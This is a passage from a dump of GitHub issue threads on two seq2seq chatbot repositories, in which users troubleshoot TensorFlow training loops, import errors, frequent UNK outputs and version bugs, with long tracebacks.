      <Body>It's an infinite loop by the looks of things. I've just run it for 5 days... Not very proud of myself for not noticing... Guess it will take a bit of research to determine what an appropriate duration would be (number of steps).</Body>
    </Comment>
    <Comment>
      <Owner>PW486</Owner>
      <Body>The number of steps should be at least 100,000 times.&#13;
But if I quit and run again, it is doubtful whether it will continue learning the old one.</Body>
    </Comment>
    <Comment>
      <Owner>AninditaBhowmik</Owner>
      <Body>Did the training loop exit on its own for anyone ? Is forced exit the only way out of the infinite training loop? I am using a 4GB RAM system.</Body>
    </Comment>
    <Comment>
      <Owner>shreyneil</Owner>
      <Body>Can someone be more specific about how long does it take to train the data? </Body>
    </Comment>
  </Issue_687>
  <Issue_688>
    <Repository>easy_seq2seq</Repository>
    <Title>Using Anaconda + Tensorflow + Python 3.5 config error</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I am using the above configuration on an Ubuntu Linux install and am getting the following error:
Traceback (most recent call last):
  File "execute.py", line 33, in &lt;module&gt;
    from ConfigParser import SafeConfigParser
ImportError: No module named 'ConfigParser'

I have six and configparser installed... and am at a loss as to what I am doing wrong. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>kevin7jo</Owner>
      <Body>I guess you need to check python and tensorflow version.
</Body>
    </Comment>
    <Comment>
      <Owner>tamler</Owner>
      <Body>Python 3.5 and the latest version of tenserflow from Anaconda. This is a fresh install of the complete system.
</Body>
    </Comment>
    <Comment>
      <Owner>hengluchang</Owner>
      <Body>In Python 3, CofigParser has been renamed to configparser. &#13;
&#13;
Ref: https://docs.python.org/2/library/configparser.html</Body>
    </Comment>
    <Comment>
      <Owner>Mohanmk1</Owner>
      <Body>hi,&#13;
i am facing the below error could you please help me resolve it.&#13;
![image](https://cloud.githubusercontent.com/assets/28388659/26023766/5dc3dc0a-37e1-11e7-9c84-4cca342b5c1c.png)&#13;
</Body>
    </Comment>
  </Issue_688>
  <Issue_689>
    <Repository>easy_seq2seq</Repository>
    <Title>Replies with _UNK.</Title>
    <Owner>suriyadeepan</Owner>
    <Body>A lot of the time when I talk to the model it replies with simply _UNK. Especially for quite short queries. When I train with my own larger corpus it does this a lot more than with the movie corpus although it still happens with that.
![screen shot 2016-09-23 at 1 24 51 pm](https://cloud.githubusercontent.com/assets/1134580/18771215/26a133dc-8191-11e6-8fc8-7c6b1265587b.png)

I'm wondering if this is because I just haven't trained the model long enough, or perhaps am not processing my own corpus properly.

I've tried some different layer sizes, and number of layers too.
</Body>
    <State>open</State>
    <Comment>
      <Owner>mynameisvinn</Owner>
      <Body>@minimumnz _UNK (or unknown) is a special token reserved for infrequent words. therefore changing size or number of layers wont make a difference. instead, when you encode text into one hot encoding you should increase the vocabulary size, which should indirectly reduce the number of UNK responses.

for example, in the seminal "Building End-To-End Dialogue Systems Using Generative Hierarchical Neural Network Models" paper, the model was trained only on the 10,000 most frequent words - everything else was replaced with UNK.
</Body>
    </Comment>
  </Issue_689>
  <Issue_690>
    <Repository>easy_seq2seq</Repository>
    <Title>[Question] Its possible to serve/test while training?</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Its possible to serve/test while training?
Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>suriyadeepan</Owner>
      <Body>Yes, it is. But you will be serving the old model, not the one that is being updated by the train function. 

### Train

`python execute.py # with mode = train, in seq2seq.ini`

### Test

`python ui/app.py # with mode = serve, in seq2seq_serve.ini`

What you can do is, you can periodically check for updates in the model, and reinitialize your test/serve session with new model parameters. I will try to implement this in the future. Thanks for suggesting it. 
</Body>
    </Comment>
    <Comment>
      <Owner>kauegimenes</Owner>
      <Body>@suriyadeepan Thanks for the reply!

I tried using mode = serve and the command `python3 ui/app.py`
But i get this error:
`ImportError: No module named 'execute'
`
</Body>
    </Comment>
    <Comment>
      <Owner>kauegimenes</Owner>
      <Body>@suriyadeepan Fixed. 
Auto update the serve to the last model would be a nice feature!
</Body>
    </Comment>
    <Comment>
      <Owner>harikrishnanvh</Owner>
      <Body>@kauegimenes how did you fix the error 'ImportError: No module named 'execute' . Can you please help 
</Body>
    </Comment>
    <Comment>
      <Owner>jrthom18</Owner>
      <Body>@harikrishnanvh add the following imports: above the lines in ui/app.py 
`import tensorflow as tf`
`import execute` 
add the lines: 
`import sys`
`import os.static_url_path`
`sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))`
</Body>
    </Comment>
    <Comment>
      <Owner>harikrishnanvh</Owner>
      <Body>@jrthom18 Thanks a ton. It worked beautifully. 
</Body>
    </Comment>
    <Comment>
      <Owner>PW486</Owner>
      <Body>@jrthom18 &#13;
&#13;
```&#13;
import os.static_url_path&#13;
ImportError: No module named static_url_path&#13;
```&#13;
&#13;
I have made an error here&#13;
&#13;
```&#13;
import os.path&#13;
```&#13;
changed it this way. works well. THANKYOU!</Body>
    </Comment>
  </Issue_690>
  <Issue_691>
    <Repository>practical_seq2seq</Repository>
    <Title>FileNotFoundError: [Errno 2] No such file or directory: 'datasets/twitter/metadata.pkl'</Title>
    <Owner>suriyadeepan</Owner>
    <Body>martin@ubuntu:~/Downloads/practical_seq2seq$ python3 03-Twitter-chatbot.py &#13;
Traceback (most recent call last):&#13;
  File "03-Twitter-chatbot.py", line 12, in &lt;module&gt;&#13;
    metadata, idx_q, idx_a = data.load_data(PATH='datasets/twitter/')&#13;
  File "/home/martin/Downloads/practical_seq2seq/datasets/twitter/data.py", line 205, in load_data&#13;
    with open(PATH + 'metadata.pkl', 'rb') as f:&#13;
FileNotFoundError: [Errno 2] No such file or directory: 'datasets/twitter/metadata.pkl'&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>virajrai</Owner>
      <Body>you need to unzip the seq2seq.twitter.tar.gz. Execute the following:&#13;
&#13;
`tar seq2seq.twitter.tar.gz`</Body>
    </Comment>
  </Issue_691>
  <Issue_692>
    <Repository>practical_seq2seq</Repository>
    <Title>Error in restoring session weights - read less byte</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hi,&#13;
I am getting this weird error while running the chatbot code. I am using tensorflow 0.12.1 and python 3.5 using anaconda.&#13;
  [[Node: save/RestoreV2_49 = RestoreV2[dtypes=[DT_FLOAT], _device="/job:localhost/replica:0/task:0/cpu:0"](_recv_save/Const_0, save/RestoreV2_49/tensor_names, save/RestoreV2_49/shape_and_slices)]]&#13;
&#13;
Caused by op 'save/RestoreV2_49', defined at:&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/runpy.py", line 193, in _run_module_as_main&#13;
    "__main__", mod_spec)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/runpy.py", line 85, in _run_code&#13;
    exec(code, run_globals)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel_launcher.py", line 16, in &lt;module&gt;&#13;
    app.launch_new_instance()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/traitlets/config/application.py", line 658, in launch_instance&#13;
    app.start()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/kernelapp.py", line 477, in start&#13;
    ioloop.IOLoop.instance().start()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/zmq/eventloop/ioloop.py", line 177, in start&#13;
    super(ZMQIOLoop, self).start()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tornado/ioloop.py", line 888, in start&#13;
    handler_func(fd_obj, events)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tornado/stack_context.py", line 277, in null_wrapper&#13;
    return fn(*args, **kwargs)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/zmq/eventloop/zmqstream.py", line 440, in _handle_events&#13;
    self._handle_recv()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/zmq/eventloop/zmqstream.py", line 472, in _handle_recv&#13;
    self._run_callback(callback, msg)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/zmq/eventloop/zmqstream.py", line 414, in _run_callback&#13;
    callback(*args, **kwargs)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tornado/stack_context.py", line 277, in null_wrapper&#13;
    return fn(*args, **kwargs)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/kernelbase.py", line 283, in dispatcher&#13;
    return self.dispatch_shell(stream, msg)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/kernelbase.py", line 235, in dispatch_shell&#13;
    handler(stream, idents, msg)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/kernelbase.py", line 399, in execute_request&#13;
    user_expressions, allow_stdin)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/ipkernel.py", line 196, in do_execute&#13;
    res = shell.run_cell(code, store_history=store_history, silent=silent)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/ipykernel/zmqshell.py", line 533, in run_cell&#13;
    return super(ZMQInteractiveShell, self).run_cell(*args, **kwargs)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py", line 2698, in run_cell&#13;
    interactivity=interactivity, compiler=compiler, result=result)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py", line 2802, in run_ast_nodes&#13;
    if self.run_code(code, result):&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py", line 2862, in run_code&#13;
    exec(code_obj, self.user_global_ns, self.user_ns)&#13;
  File "&lt;ipython-input-2-cca62aa8005e&gt;", line 59, in &lt;module&gt;&#13;
    session = model.restore_last_session()&#13;
  File "/Users/trinakarmakar/anaconda3/seq2seq_wrapper.py", line 164, in restore_last_session&#13;
    saver = tf.train.Saver()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/training/saver.py", line 1000, in __init__&#13;
    self.build()&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/training/saver.py", line 1030, in build&#13;
    restore_sequentially=self._restore_sequentially)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/training/saver.py", line 624, in build&#13;
    restore_sequentially, reshape)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/training/saver.py", line 361, in _AddRestoreOps&#13;
    tensors = self.restore_op(filename_tensor, saveable, preferred_shard)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/training/saver.py", line 200, in restore_op&#13;
    [spec.tensor.dtype])[0])&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/ops/gen_io_ops.py", line 441, in restore_v2&#13;
    dtypes=dtypes, name=name)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/op_def_library.py", line 759, in apply_op&#13;
    op_def=op_def)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py", line 2240, in create_op&#13;
    original_op=self._default_original_op, op_def=op_def)&#13;
  File "/Users/trinakarmakar/anaconda3/lib/python3.6/site-packages/tensorflow/python/framework/ops.py", line 1128, in __init__&#13;
    self._traceback = _extract_stack()&#13;
&#13;
OutOfRangeError (see above for traceback): Read less bytes than requested&#13;
  [[Node: save/RestoreV2_49 = RestoreV2[dtypes=[DT_FLOAT], _device="/job:localhost/replica:0/task:0/cpu:0"](_recv_save/Const_0, save/RestoreV2_49/tensor_names, save/RestoreV2_49/shape_and_slices)]] </Body>
    <State>open</State>
    <Comment>
      <Owner>PedroPei</Owner>
      <Body>Please try to use tf 1.0.0</Body>
    </Comment>
  </Issue_692>
  <Issue_693>
    <Repository>practical_seq2seq</Repository>
    <Title>I unable to test the model</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I used this code.&#13;
import tensorflow as tf&#13;
import numpy as np&#13;
&#13;
# preprocessed data&#13;
from datasets.twitter import data&#13;
import data_utils&#13;
&#13;
# load data from pickle and npy files&#13;
metadata, idx_q, idx_a = data.load_data(PATH='/home/kusuma/Videos/practical_seq2seq-master/datasets/twitter')&#13;
(trainX, trainY), (testX, testY), (validX, validY) = data_utils.split_dataset(idx_q, idx_a)&#13;
&#13;
# parameters&#13;
xseq_len = testX.shape[-1]&#13;
yseq_len = testY.shape[-1]&#13;
batch_size = 16&#13;
xvocab_size = len(metadata['idx2w'])&#13;
yvocab_size = xvocab_size&#13;
emb_dim = 1024&#13;
&#13;
import seq2seq_wrapper&#13;
&#13;
import importlib&#13;
importlib.reload(seq2seq_wrapper)&#13;
&#13;
model = seq2seq_wrapper.Seq2Seq(xseq_len=xseq_len,&#13;
                               yseq_len=yseq_len,&#13;
                               xvocab_size=xvocab_size,&#13;
                               yvocab_size=yvocab_size,&#13;
                               ckpt_path='/home/kusuma/Videos/practical_seq2seq-master/ckpt/twitterseq2seq_model.ckpt-11000.data-00000-of-00001',&#13;
                               emb_dim=emb_dim,&#13;
                               num_layers=3&#13;
                               )&#13;
&#13;
#val_batch_gen = data_utils.rand_batch_gen(validX, validY, 256)&#13;
test_batch_gen = data_utils.rand_batch_gen(testX, testY, 256)&#13;
#train_batch_gen = data_utils.rand_batch_gen(trainX, trainY, batch_size)&#13;
&#13;
sess = model.test(test_batch_gen)&#13;
#sess = model.restore_last_session()&#13;
&#13;
input_ = test_batch_gen.__next__()[0]&#13;
output = model.predict(sess, input_)&#13;
print(output.shape)&#13;
replies = []&#13;
for ii, oi in zip(input_.T, output):&#13;
    q = data_utils.decode(sequence=ii, lookup=metadata['idx2w'], separator=' ')&#13;
    decoded = data_utils.decode(sequence=oi, lookup=metadata['idx2w'], separator=' ').split(' ')&#13;
    if decoded.count('unk') == 0:&#13;
        if decoded not in replies:&#13;
            print('q : [{0}]; a : [{1}]'.format(q, ' '.join(decoded)))&#13;
            replies.append(decoded)&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
I got errors:&#13;
usr/bin/python3.5 /home/kusuma/Videos/practical_seq2seq-master/test.py&#13;
Traceback (most recent call last):&#13;
  File "/home/kusuma/Videos/practical_seq2seq-master/test.py", line 42, in &lt;module&gt;&#13;
&lt;log&gt; Building Graph &lt;/log&gt;    output = model.predict(sess, input_)&#13;
  File "/home/kusuma/Videos/practical_seq2seq-master/seq2seq_wrapper.py", line 175, in predict&#13;
    dec_op_v = sess.run(self.decode_outputs_test, feed_dict)&#13;
AttributeError: 'NoneType' object has no attribute 'run'</Body>
    <State>open</State>
    <Comment>
      <Owner>PedroPei</Owner>
      <Body>Oh,I see.You didn't load your model to sess before you run it.&#13;
You need to save your model after training using saver and load the model before you test it.&#13;
</Body>
    </Comment>
  </Issue_693>
  <Issue_694>
    <Repository>practical_seq2seq</Repository>
    <Title>Unable to train the model</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I tried training your model for around 20,000 iterations on a GPU but when I tested it on the testing data and the unseen data, it is always printing "I don't know".Can someone please help me out?&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>PedroPei</Owner>
      <Body>You've faced a common problem in seq2seq learning. Based on my experience,it's probably because the learning rate is too small for the model to get out of the 'trap' of same response.Try to use bigger learning rate like 0.2 or even 1.</Body>
    </Comment>
  </Issue_694>
  <Issue_695>
    <Repository>practical_seq2seq</Repository>
    <Title>Update seq2seq_wrapper.py</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Answer to this issue :https://github.com/suriyadeepan/practical_seq2seq/issues/47&#13;
I think it is due to the tensorflow upgraded libraries </Body>
    <State>open</State>
    <Comment>
      <Owner>karanpande</Owner>
      <Body>Thank you got it done . I want to reduce the number of iteration , but in the seq-toseq wrapper file i only see epoches , i have two questions &#13;
1: Are epochs are iteration same , if not how do i reduce iteration in our code. </Body>
    </Comment>
  </Issue_695>
  <Issue_696>
    <Repository>practical_seq2seq</Repository>
    <Title>mini-batch loss, how low is low enough?</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hi all,&#13;
&#13;
I have been trying to duplicate the level of quality seen on the example page for the Cornell Movie dialogue and I am wondering how low have you guys driven the min-batch loss to get that type of replies? I am having trouble getting my decoder inference output to that level of comprehension. &#13;
&#13;
I am also wondering for the CornellMovieDialogue corpus. Is the input going into the model as is? When I read the dialogue some of it doesn't even seem to make sense:&#13;
&#13;
('Not the hacking and gagging and spitting part.  Please.',&#13;
 "Okay... then how 'bout we try out some French cuisine.  Saturday?  Night?")&#13;
&#13;
('Can we make this quick?  Roxanne Korrine and Andrew Barrett are having an incredibly horrendous public break- up on the quad.  Again.',&#13;
 "Well, I thought we'd start with pronunciation, if that's okay with you.")&#13;
&#13;
as in, the answer is not referencing any information in the question.&#13;
&#13;
As an additional note, I am also not exactly using the tutorials shown here, I have been piecing together tutorial scripts on seq2seq from our git for my own understanding so its always possible I have a bug in my code. Nonetheless, I do wonder about my question above.&#13;
&#13;
Cheers,&#13;
&#13;
Kuhan</Body>
    <State>open</State>
    <Comment>
      <Owner>kuhanw</Owner>
      <Body>Hey all,&#13;
&#13;
As a sanity check, I just tried to reproduce the twitter results from http://suriyadeepan.github.io/2016-12-31-practical-seq2seq/, and my training loss does not seem to decrease significantly just using the out of the box code. Do I have to do some specific tuning of the hyperparameters?&#13;
&#13;
My training loss in the final epochs look like : &#13;
&#13;
&#13;
Model saved to disk at iteration #95000&#13;
val   loss : 3.397206&#13;
&#13;
Model saved to disk at iteration #96000&#13;
val   loss : 3.424180&#13;
&#13;
Model saved to disk at iteration #97000&#13;
val   loss : 3.283931&#13;
&#13;
Model saved to disk at iteration #98000&#13;
val   loss : 3.356802&#13;
&#13;
Model saved to disk at iteration #99000&#13;
val   loss : 3.486829&#13;
&#13;
I am using the out of box  03-Twitter-chatbot.py script.&#13;
&#13;
Thank You,&#13;
&#13;
Kuhan</Body>
    </Comment>
    <Comment>
      <Owner>zp672087110</Owner>
      <Body>when i at epoch 62401, the loss i got was 2.523555</Body>
    </Comment>
  </Issue_696>
  <Issue_697>
    <Repository>practical_seq2seq</Repository>
    <Title>Too many UNK in the output</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I trained the network for 5000 iterations; see the loss below&#13;
&#13;
&lt;log&gt; Building Graph &lt;/log&gt;&#13;
&lt;log&gt; Training started &lt;/log&gt;&#13;
&#13;
Model saved to disk at iteration #1000&#13;
val   loss : 3.290424&#13;
&#13;
Model saved to disk at iteration #2000&#13;
val   loss : 3.261373&#13;
&#13;
Model saved to disk at iteration #3000&#13;
val   loss : 3.224990&#13;
&#13;
Model saved to disk at iteration #4000&#13;
val   loss : 3.151570&#13;
&#13;
Model saved to disk at iteration #5000&#13;
val   loss : 3.155647&#13;
&#13;
After this I wanted to evaluate the model on the test dataset. Most of the decoder's output is "unk" (see below):&#13;
&#13;
q : [hillary is crazy also evil nothing good about her except that she has a terminal illness]; a : [i unk unk unk unk unk unk unk unk unk unk unk unk unk]&#13;
q : [breaking unk unk israeli unk and unk peace prize winner dies at unk]; a : [unk unk unk unk unk unk unk unk unk unk unk unk unk]&#13;
q : [because and jason unk are fighting in the cage next week to see who unk into whom]; a : [i unk unk unk unk unk unk unk unk unk unk unk unk unk]&#13;
q : [im considering unk a ticket shit looks live ]; a : [i unk unk unk]&#13;
q : [unk is a classic but tears in heaven is stupid]; a : [i unk unk unk unk unk unk unk unk unk unk unk unk unk]&#13;
&#13;
Do you think the output is like that because I tested the model's performance too soon or that the model is not learning anything? &#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>karanpande</Owner>
      <Body>I am facing with the exact same problem, can someone guide us.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>LeenaShekhar</Owner>
      <Body>I have not worked on it after that, but from experience it might be because of the training. Usually you need t train for longer steps in such models. Try that and see it that works. I have not explored the pre-trained models tough. You can compare your output with that. </Body>
    </Comment>
  </Issue_697>
  <Issue_698>
    <Repository>practical_seq2seq</Repository>
    <Title>'NoneType' object has no attribute 'update'</Title>
    <Owner>suriyadeepan</Owner>
    <Body>When I run the code &#13;
self.decode_outputs, self.decode_states = tf.contrib.legacy_seq2seq.embedding_rnn_seq2seq(self.enc_ip,self.dec_ip, stacked_lstm,&#13;
                                                    xvocab_size, yvocab_size, emb_dim)&#13;
it occurs 'NoneType' object has no attribute 'update'.&#13;
Thanks for help!</Body>
    <State>open</State>
    <Comment>
      <Owner>linzhp</Owner>
      <Body>This is due to a bug in tensorflow seq2seq module: https://stackoverflow.com/questions/44591282/error-when-running-tensorflow-sequence-to-sequence-tutorial</Body>
    </Comment>
    <Comment>
      <Owner>jerryjingli</Owner>
      <Body>How to fix this issue?  &#13;
tensorflow.__version__  &#13;
'1.1.0'&#13;
&#13;
 self.decode_outputs, self.decode_states = tf.contrib.legacy_seq2seq.embedding_rnn_seq2seq(self.enc_ip,self.dec_ip, stacked_lstm,&#13;
                                                    xvocab_size, yvocab_size, emb_dim)&#13;
&#13;
AttributeError: 'NoneType' object has no attribute 'update'</Body>
    </Comment>
    <Comment>
      <Owner>AaronTan120</Owner>
      <Body>I am currently facing the same issue, has anyone found the fix for this yet?</Body>
    </Comment>
    <Comment>
      <Owner>kortatu</Owner>
      <Body>I have overcome this problem using tensorflow 1.0 (the bug affects  tensorflow 1.1 )</Body>
    </Comment>
  </Issue_698>
  <Issue_699>
    <Repository>practical_seq2seq</Repository>
    <Title>ImportError: No module named datasets.twitter</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hello,&#13;
&#13;
getting below error on running "03-Twitter-chatbot.ipynb" in notebook, the file is exists (data.py)&#13;
&#13;
ImportError                               Traceback (most recent call last)&#13;
&lt;ipython-input-3-0bf504ff705c&gt; in &lt;module&gt;()&#13;
      3 &#13;
      4 # preprocessed data&#13;
----&gt; 5 from datasets.twitter import data&#13;
      6 import data_utils&#13;
&#13;
ImportError: No module named datasets.twitter</Body>
    <State>open</State>
    <Comment>
      <Owner>fallenangel3k</Owner>
      <Body>i have same issue.... but i am running the .py version of it.... please help!</Body>
    </Comment>
    <Comment>
      <Owner>Bazarovay</Owner>
      <Body>you might be using python 2.7. If that is the case create a __init__.py file inside datasets folder</Body>
    </Comment>
    <Comment>
      <Owner>bandarikanth</Owner>
      <Body>Hi, &#13;
Use python 3.5 to overcome the issue</Body>
    </Comment>
  </Issue_699>
  <Issue_700>
    <Repository>practical_seq2seq</Repository>
    <Title>can't pickle _thread.lock objects</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I'm running the twitter chatbot code but I'm getting the next error: "can't pickle _thread.lock objects"&#13;
&#13;
What does that means?</Body>
    <State>open</State>
    <Comment>
      <Owner>dexterchan</Owner>
      <Body>I got the same issue with Python 3.6 with tensor 1.1.0&#13;
&lt;log&gt; Building Graph  &#13;
---------------------------------------------------------------------------&#13;
TypeError                                 Traceback (most recent call last)&#13;
&lt;ipython-input-6-01139c0a9bce&gt; in &lt;module&gt;()&#13;
      5                                ckpt_path='ckpt/cmudict/',&#13;
      6                                emb_dim=emb_dim,&#13;
----&gt; 7                                num_layers=3&#13;
      8                                )&#13;
&#13;
/Users/dexter/Downloads/TensorFlowTutorial/practical_seq2seq-master/seq2seq_wrapper.py in __init__(self, xseq_len, yseq_len, xvocab_size, yvocab_size, emb_dim, num_layers, ckpt_path, lr, epochs, model_name)&#13;
     77         sys.stdout.write('&lt;log&gt; Building Graph ')&#13;
     78         # build comput graph&#13;
---&gt; 79         __graph__()&#13;
     80         sys.stdout.write('&lt;/log&gt;')&#13;
     81 &#13;
&#13;
/Users/dexter/Downloads/TensorFlowTutorial/practical_seq2seq-master/seq2seq_wrapper.py in __graph__()&#13;
     56                 #  inputs : encoder, decoder inputs, LSTM cell type, vocabulary sizes, embedding dimensions&#13;
     57                 self.decode_outputs, self.decode_states = tf.contrib.legacy_seq2seq.embedding_rnn_seq2seq(self.enc_ip,self.dec_ip, stacked_lstm,&#13;
---&gt; 58                                                     xvocab_size, yvocab_size, emb_dim)&#13;
     59                 # share parameters&#13;
     60                 scope.reuse_variables()&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/site-packages/tensorflow/contrib/legacy_seq2seq/python/ops/seq2seq.py in embedding_rnn_seq2seq(encoder_inputs, decoder_inputs, cell, num_encoder_symbols, num_decoder_symbols, embedding_size, output_projection, feed_previous, dtype, scope)&#13;
    356 &#13;
    357     # Encoder.&#13;
--&gt; 358     encoder_cell = copy.deepcopy(cell)&#13;
    359     encoder_cell = core_rnn_cell.EmbeddingWrapper(&#13;
    360         encoder_cell,&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    178                     y = x&#13;
    179                 else:&#13;
--&gt; 180                     y = _reconstruct(x, memo, *rv)&#13;
    181 &#13;
    182     # If is its own copy, don't memoize.&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy)&#13;
    278     if state is not None:&#13;
    279         if deep:&#13;
--&gt; 280             state = deepcopy(state, memo)&#13;
    281         if hasattr(y, '__setstate__'):&#13;
    282             y.__setstate__(state)&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_dict(x, memo, deepcopy)&#13;
    238     memo[id(x)] = y&#13;
    239     for key, value in x.items():&#13;
--&gt; 240         y[deepcopy(key, memo)] = deepcopy(value, memo)&#13;
    241     return y&#13;
    242 d[dict] = _deepcopy_dict&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_list(x, memo, deepcopy)&#13;
    213     append = y.append&#13;
    214     for a in x:&#13;
--&gt; 215         append(deepcopy(a, memo))&#13;
    216     return y&#13;
    217 d[list] = _deepcopy_list&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    178                     y = x&#13;
    179                 else:&#13;
--&gt; 180                     y = _reconstruct(x, memo, *rv)&#13;
    181 &#13;
    182     # If is its own copy, don't memoize.&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy)&#13;
    278     if state is not None:&#13;
    279         if deep:&#13;
--&gt; 280             state = deepcopy(state, memo)&#13;
    281         if hasattr(y, '__setstate__'):&#13;
    282             y.__setstate__(state)&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_dict(x, memo, deepcopy)&#13;
    238     memo[id(x)] = y&#13;
    239     for key, value in x.items():&#13;
--&gt; 240         y[deepcopy(key, memo)] = deepcopy(value, memo)&#13;
    241     return y&#13;
    242 d[dict] = _deepcopy_dict&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    178                     y = x&#13;
    179                 else:&#13;
--&gt; 180                     y = _reconstruct(x, memo, *rv)&#13;
    181 &#13;
    182     # If is its own copy, don't memoize.&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy)&#13;
    278     if state is not None:&#13;
    279         if deep:&#13;
--&gt; 280             state = deepcopy(state, memo)&#13;
    281         if hasattr(y, '__setstate__'):&#13;
    282             y.__setstate__(state)&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_dict(x, memo, deepcopy)&#13;
    238     memo[id(x)] = y&#13;
    239     for key, value in x.items():&#13;
--&gt; 240         y[deepcopy(key, memo)] = deepcopy(value, memo)&#13;
    241     return y&#13;
    242 d[dict] = _deepcopy_dict&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    178                     y = x&#13;
    179                 else:&#13;
--&gt; 180                     y = _reconstruct(x, memo, *rv)&#13;
    181 &#13;
    182     # If is its own copy, don't memoize.&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy)&#13;
    278     if state is not None:&#13;
    279         if deep:&#13;
--&gt; 280             state = deepcopy(state, memo)&#13;
    281         if hasattr(y, '__setstate__'):&#13;
    282             y.__setstate__(state)&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in deepcopy(x, memo, _nil)&#13;
    148     copier = _deepcopy_dispatch.get(cls)&#13;
    149     if copier:&#13;
--&gt; 150         y = copier(x, memo)&#13;
    151     else:&#13;
    152         try:&#13;
&#13;
/Users/dexter/anaconda/lib/python3.6/copy.py in _deepcopy_dict(x, memo, deepcopy)&#13;
